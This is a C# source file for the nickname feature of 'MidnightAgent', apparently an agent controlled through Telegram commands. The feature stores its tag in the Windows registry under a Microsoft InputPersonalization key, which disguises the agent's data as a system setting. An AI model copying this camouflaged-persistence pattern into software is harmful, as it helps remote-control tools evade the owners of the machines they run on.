using System;
using System.Threading.Tasks;
using Microsoft.Win32;
using MidnightAgent.Core;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class NickFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "nick";
        public string Description => "Set a nickname for this agent";
        public string Usage => "/nick <name>";

        private const string NickRegKey = @"Software\Microsoft\InputPersonalization";
        private const string NickRegValue = "UserTag";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                // Get current nick
                string current = GetNickname();
                if (string.IsNullOrEmpty(current)) return Task.FromResult(FeatureResult.Ok("No nickname set."));
                return Task.FromResult(FeatureResult.Ok($"Current nickname: {current}"));
            }

            string newNick = string.Join(" ", args);

            // Check for clear command
            if (newNick.Equals("clean", StringComparison.OrdinalIgnoreCase) || 
                newNick.Equals("clear", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(NickRegKey, true))
                    {
                        if (key != null) key.DeleteValue(NickRegValue, false);
                    }
                    return Task.FromResult(FeatureResult.Ok("🗑️ Nickname cleared."));
                }
                catch (Exception ex)
                {
                    return Task.FromResult(FeatureResult.Fail($"Error clearing nickname: {ex.Message}"));
                }
            }

            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(NickRegKey))
                {
                    key.SetValue(NickRegValue, newNick);
                }
                return Task.FromResult(FeatureResult.Ok($"✅ Nickname set to: <b>{newNick}</b>"));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error setting nickname: {ex.Message}"));
            }
        }

        public static string GetNickname()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(NickRegKey))
                {
                    if (key != null)
                    {
                        object val = key.GetValue(NickRegValue);
                        if (val != null) return val.ToString();
                    }
                }
            }
            catch { }
            return null;
        }
    }
}
